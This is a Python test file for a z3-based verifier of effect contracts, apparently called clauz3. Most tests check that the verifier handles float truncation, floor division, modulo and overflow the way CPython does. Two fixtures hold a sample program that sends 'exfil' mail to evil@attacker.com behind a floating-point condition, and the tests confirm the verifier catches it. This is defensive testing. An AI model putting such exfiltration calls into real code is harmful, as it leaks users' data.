"""Regressions for Python-compatible floating-point integer operations."""

import math
import random
from pathlib import Path

import pytest
import z3

from clauz3._vendor.deal_solver import Conclusion
from clauz3._vendor.deal_solver._proxies._float import (
    FPSort,
    _python_float_divmod,
    _python_fmod,
)
from clauz3.prover import ProofResult, prove_text

ROOT = Path(__file__).resolve().parents[1]
EMAIL_ROOT = ROOT / "examples/email"
EMAIL_TRUSTED_ROOT = EMAIL_ROOT / "tools/email/trusted"


def _prove(source: str) -> ProofResult:
    results = prove_text(source)
    assert len(results) == 1
    return results[0]


def test_negative_float_int_does_not_hide_live_effect() -> None:
    """Issue #110: ``int(-2.5)`` is -2, so this effect is reachable."""
    results = prove_text(
        """\
import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@clauz3.guarantee(email.none())
def main(x: float) -> None:
    if x == -2.5 and int(x) == -2:
        send_email("evil@attacker.com", "exfil")
""",
        import_paths=[EMAIL_ROOT],
        trusted_roots=[EMAIL_TRUSTED_ROOT],
    )

    assert len(results) == 1
    assert results[0].proof.conclusion is Conclusion.FAIL


def test_negative_float_math_trunc_does_not_hide_live_effect() -> None:
    """``math.trunc(-2.5)`` is -2, so this effect is reachable."""
    results = prove_text(
        """\
import math

import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@clauz3.guarantee(email.none())
def main(x: float) -> None:
    if x == -2.5 and math.trunc(x) == -2:
        send_email("evil@attacker.com", "exfil")
""",
        import_paths=[EMAIL_ROOT],
        trusted_roots=[EMAIL_TRUSTED_ROOT],
    )

    assert len(results) == 1
    assert results[0].proof.conclusion is Conclusion.FAIL


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("-2.5", -2),
        ("2.5", 2),
        ("-2.0", -2),
        ("2.0", 2),
    ],
)
def test_float_int_truncates_toward_zero(value: str, expected: int) -> None:
    result = _prove(f"""\
def main() -> None:
    assert int({value}) == {expected}
""")

    assert result.proof.conclusion is Conclusion.OK


def test_symbolic_fp_int_truncates_toward_zero() -> None:
    result = _prove("""\
def main(x: float) -> None:
    if x == -2.5:
        assert int(x) == -2
""")

    assert result.proof.conclusion is Conclusion.OK


def test_symbolic_binary64_int_truncates_toward_zero() -> None:
    """Integer true division rounds to binary64 before ``int`` truncates it."""
    result = _prove("""\
def main(n: int) -> None:
    if n == -1:
        value = n / 2
        assert int(value) == 0
""")

    assert result.proof.conclusion is Conclusion.OK


@pytest.mark.parametrize(
    ("expected", "conclusion"),
    [
        (-2, Conclusion.OK),
        (-1, Conclusion.FAIL),
    ],
)
def test_math_trunc_negative_float_truncates_toward_zero(
    expected: int,
    conclusion: Conclusion,
) -> None:
    result = _prove(f"""\
import math


def main() -> None:
    assert math.trunc(-2.5) == {expected}
""")

    assert result.proof.conclusion is conclusion


@pytest.mark.parametrize(
    "assertion",
    [
        "-5.0 // 2.0 == -3.0",
        "5.0 // -2.0 == -3.0",
        "-5.0 % 2.0 == 1.0",
        "5.0 % -2.0 == -1.0",
    ],
)
def test_negative_float_divmod_uses_python_semantics(assertion: str) -> None:
    """``//`` floors while ``%`` takes the divisor's sign."""
    result = _prove(f"""\
def main() -> None:
    assert {assertion}
""")

    assert result.proof.conclusion is Conclusion.OK


def test_symbolic_binary64_floor_division_still_floors() -> None:
    result = _prove("""\
def main(n: int) -> None:
    if n == -5:
        assert (n / 2) // 1 == -3.0
""")

    assert result.proof.conclusion is Conclusion.OK


@pytest.mark.parametrize(
    "assertion",
    [
        "5 // 2.9 == 1.0",
        "5 % 2.9 == 2.1",
        "5 // -2.9 == -2.0",
        "5 % -2.9 == -0.7999999999999998",
        "-5 // 2.9 == -2.0",
        "-5 % 2.9 == 0.7999999999999998",
        "-5 // -2.9 == 1.0",
        "-5 % -2.9 == -2.1",
    ],
)
def test_mixed_int_float_divmod_uses_float_rhs(assertion: str) -> None:
    result = _prove(f"""\
def main() -> None:
    assert {assertion}
""")

    assert result.proof.conclusion is Conclusion.OK


@pytest.mark.parametrize(
    "false_assertion",
    [
        "5 // 2.9 == 2.0",
        "5 % 2.9 == 1.0",
        "-5 // 2.9 == -3.0",
        "-5 % 2.9 == 1.0",
    ],
)
def test_mixed_int_float_divmod_rejects_truncated_rhs(
    false_assertion: str,
) -> None:
    result = _prove(f"""\
def main() -> None:
    assert {false_assertion}
""")

    assert result.proof.conclusion is Conclusion.FAIL


@pytest.mark.parametrize(
    ("assertion", "conclusion"),
    [
        ("1.0 // 0.1 == 9.0", Conclusion.OK),
        ("1.0 // 0.1 == 10.0", Conclusion.FAIL),
    ],
)
def test_float_floor_division_uses_divmod_rounding(
    assertion: str,
    conclusion: Conclusion,
) -> None:
    result = _prove(f"""\
def main() -> None:
    assert {assertion}
""")

    assert result.proof.conclusion is conclusion


@pytest.mark.parametrize("left", ["1", "1.0"])
@pytest.mark.parametrize(
    ("quotient", "conclusion"),
    [
        ("-7481664862465814.0", Conclusion.OK),
        ("-7481664862465813.0", Conclusion.FAIL),
    ],
)
def test_float_floor_division_uses_original_remainder_order(
    left: str,
    quotient: str,
    conclusion: Conclusion,
) -> None:
    """Regression for CPython's pre-sign-adjustment quotient operation."""
    result = _prove(f"""\
def main() -> None:
    assert {left} // -1.3366009015143444e-16 == {quotient}
""")

    assert result.proof.conclusion is conclusion


@pytest.mark.parametrize(
    ("quotient", "conclusion"),
    [
        ("9554753773351790.0", Conclusion.OK),
        ("9554753773351788.0", Conclusion.FAIL),
    ],
)
def test_float_floor_division_starts_from_truncating_fmod(
    quotient: str,
    conclusion: Conclusion,
) -> None:
    """IEEE nearest remainder cannot stand in for C/Python ``fmod``."""
    result = _prove(f"""\
def main() -> None:
    assert (
        -2.5343953294430905e201 // -2.6524967461867198e185
        == {quotient}
    )
""")

    assert result.proof.conclusion is conclusion


@pytest.mark.parametrize(
    ("expression", "description"),
    [
        ("int(1e309)", "OverflowError"),
        ("int(1e309 - 1e309)", "ValueError"),
        ("1.0 / 0.0", "ZeroDivisionError"),
        ("1.0 // -0.0", "ZeroDivisionError"),
        ("1.0 % 0.0", "ZeroDivisionError"),
        ("1 / 0", "ZeroDivisionError"),
        ("1 // 0", "ZeroDivisionError"),
        ("1 % 0", "ZeroDivisionError"),
        ("math.trunc(1e309)", "OverflowError"),
        ("math.trunc(1e309 - 1e309)", "ValueError"),
    ],
)
def test_float_integer_operations_report_python_exceptions(
    expression: str,
    description: str,
) -> None:
    result = _prove(f"""\
import math


def main() -> None:
    {expression}
    assert True
""")

    assert result.proof.conclusion is Conclusion.FAIL
    assert result.proof.description.startswith(description)


@pytest.mark.parametrize(
    ("operation", "description"),
    [
        ("1 // divisor", "ZeroDivisionError"),
        ("1 % divisor", "ZeroDivisionError"),
    ],
)
def test_symbolic_int_zero_divisors_report_exceptions(
    operation: str,
    description: str,
) -> None:
    result = _prove(f"""\
def main(divisor: int) -> None:
    if divisor == 0:
        {operation}
        assert True
""")

    assert result.proof.conclusion is Conclusion.FAIL
    assert result.proof.description.startswith(description)


@pytest.mark.parametrize(
    ("operation", "description"),
    [
        ("1.0 / divisor", "ZeroDivisionError"),
        ("1.0 // divisor", "ZeroDivisionError"),
        ("1.0 % divisor", "ZeroDivisionError"),
    ],
)
def test_symbolic_float_zero_divisors_report_exceptions(
    operation: str,
    description: str,
) -> None:
    result = _prove(f"""\
def main(divisor: float) -> None:
    if divisor == 0.0:
        {operation}
        assert True
""")

    assert result.proof.conclusion is Conclusion.FAIL
    assert result.proof.description.startswith(description)


@pytest.mark.parametrize(
    ("condition", "description"),
    [
        ("value == 1e309", "OverflowError"),
        ("math.isnan(value)", "ValueError"),
    ],
)
@pytest.mark.parametrize("conversion", ["int(value)", "math.trunc(value)"])
def test_symbolic_nonfinite_float_int_reports_exceptions(
    condition: str,
    description: str,
    conversion: str,
) -> None:
    result = _prove(f"""\
import math


def main(value: float) -> None:
    if {condition}:
        {conversion}
        assert True
""")

    assert result.proof.conclusion is Conclusion.FAIL
    assert result.proof.description.startswith(description)


@pytest.mark.parametrize(
    ("assertion", "conclusion"),
    [
        (
            "int(9007199254740993 / 1) == 9007199254740992",
            Conclusion.OK,
        ),
        (
            "int(9007199254740993 / 1) == 9007199254740993",
            Conclusion.FAIL,
        ),
        ("5e-324 / 2.0 == 0.0", Conclusion.OK),
    ],
)
def test_float_results_use_binary64_rounding(
    assertion: str,
    conclusion: Conclusion,
) -> None:
    result = _prove(f"""\
def main() -> None:
    assert {assertion}
""")

    assert result.proof.conclusion is conclusion


def test_int_true_division_does_not_preconvert_large_operands() -> None:
    """CPython rounds the exact ratio, so equal huge integers yield 1.0."""
    huge = "1" + "0" * 400
    result = _prove(f"""\
def main() -> None:
    assert {huge} / {huge} == 1.0
""")

    assert result.proof.conclusion is Conclusion.OK


@pytest.mark.parametrize(
    ("statement", "description"),
    [
        ("{huge} / 1", "OverflowError"),
        ("float({huge})", "OverflowError"),
    ],
)
def test_large_int_float_results_report_overflow(
    statement: str,
    description: str,
) -> None:
    huge = "1" + "0" * 400
    result = _prove(f"""\
def main() -> None:
    {statement.format(huge=huge)}
    assert True
""")

    assert result.proof.conclusion is Conclusion.FAIL
    assert result.proof.description.startswith(description)


@pytest.mark.parametrize(
    ("assertion", "conclusion"),
    [
        ("9007199254740992.0 < 9007199254740993", Conclusion.OK),
        ("9007199254740993 > 9007199254740992.0", Conclusion.OK),
        ("9007199254740992.0 == 9007199254740993", Conclusion.FAIL),
        ("9007199254740993 == 9007199254740992.0", Conclusion.FAIL),
    ],
)
def test_mixed_float_int_comparisons_do_not_round_the_int(
    assertion: str,
    conclusion: Conclusion,
) -> None:
    result = _prove(f"""\
def main() -> None:
    assert {assertion}
""")

    assert result.proof.conclusion is conclusion


@pytest.mark.parametrize(
    ("assertion", "conclusion"),
    [
        ("True <= 1.0", Conclusion.OK),
        ("True < 1.0", Conclusion.FAIL),
        ("False < True", Conclusion.OK),
        ("True <= True", Conclusion.OK),
        ("True < False", Conclusion.FAIL),
        ("1 <= True", Conclusion.OK),
        ("2 <= True", Conclusion.FAIL),
        ("1.0 >= True", Conclusion.OK),
    ],
)
def test_ordered_bool_numeric_comparisons_use_integer_values(
    assertion: str,
    conclusion: Conclusion,
) -> None:
    result = _prove(f"""\
def main() -> None:
    assert {assertion}
""")

    assert result.proof.conclusion is conclusion


def test_symbolic_bool_ordering_uses_zero_and_one() -> None:
    result = _prove("""\
def main(value: bool) -> None:
    assert False <= value <= True
""")

    assert result.proof.conclusion is Conclusion.OK


def test_symbolic_bool_float_equality_uses_exact_integer_value() -> None:
    result = _prove("""\
def main(value: bool) -> None:
    assert (value == 1.0) == value
""")

    assert result.proof.conclusion is Conclusion.OK
    assert result.proof.description == "assertion"


@pytest.mark.parametrize("operator", ["//", "%"])
def test_nan_float_divmod_results_remain_nan(operator: str) -> None:
    result = _prove(f"""\
import math


def main() -> None:
    value = 1e309 - 1e309
    assert math.isnan(value {operator} 1.0)
""")

    assert result.proof.conclusion is Conclusion.OK


def _same_float_bits(actual: z3.FPRef, expected: float) -> bool:
    expected_expr = FPSort.val(expected).expr
    return bool(
        z3.is_true(
            z3.simplify(
                z3.fpToIEEEBV(actual) == z3.fpToIEEEBV(expected_expr),
            ),
        )
    )


def test_float_divmod_matches_cpython_differentially() -> None:
    """Exercise sign-adjustment rounding near the binary64 integer limit."""
    randomizer = random.Random(110)
    for _ in range(256):
        left = 1.0 if randomizer.getrandbits(1) else -1.0
        magnitude = math.ldexp(randomizer.uniform(0.5, 1.0), -52)
        right = math.copysign(magnitude, -left)
        expected_quotient, expected_modulo = divmod(left, right)
        quotient, modulo = _python_float_divmod(
            FPSort.val(left).expr,
            FPSort.val(right).expr,
        )

        assert _same_float_bits(quotient, expected_quotient)
        assert _same_float_bits(modulo, expected_modulo)


def _float_neighbors(value: float, radius: int) -> list[float]:
    below: list[float] = []
    current = value
    for _ in range(radius):
        current = math.nextafter(current, -math.inf)
        below.append(current)

    above: list[float] = []
    current = value
    for _ in range(radius):
        current = math.nextafter(current, math.inf)
        above.append(current)
    return [*reversed(below), value, *above]


def test_fmod_and_divmod_match_cpython_around_ieee_remainder_regression() -> None:
    left_values = _float_neighbors(-2.5343953294430905e201, 4)
    right_values = _float_neighbors(-2.6524967461867198e185, 4)

    for left in left_values:
        for right in right_values:
            left_expr = FPSort.val(left).expr
            right_expr = FPSort.val(right).expr
            remainder = _python_fmod(left_expr, right_expr)
            quotient, modulo = _python_float_divmod(left_expr, right_expr)
            expected_quotient, expected_modulo = divmod(left, right)

            assert _same_float_bits(remainder, math.fmod(left, right))
            assert _same_float_bits(quotient, expected_quotient)
            assert _same_float_bits(modulo, expected_modulo)


@pytest.mark.parametrize(
    ("left", "right", "expected_quotient", "expected_modulo"),
    [
        (0.0, -1.0, -0.0, -0.0),
        (-0.0, 1.0, -0.0, 0.0),
        (-0.0, -1.0, 0.0, -0.0),
        (1.0, float("inf"), 0.0, 1.0),
        (1.0, -float("inf"), -1.0, -float("inf")),
        (-1.0, float("inf"), -1.0, float("inf")),
        (-1.0, -float("inf"), 0.0, -1.0),
    ],
)
def test_float_divmod_preserves_python_signed_zero_and_infinity(
    left: float,
    right: float,
    expected_quotient: float,
    expected_modulo: float,
) -> None:
    quotient, modulo = _python_float_divmod(
        FPSort.val(left).expr,
        FPSort.val(right).expr,
    )

    assert _same_float_bits(quotient, expected_quotient)
    assert _same_float_bits(modulo, expected_modulo)
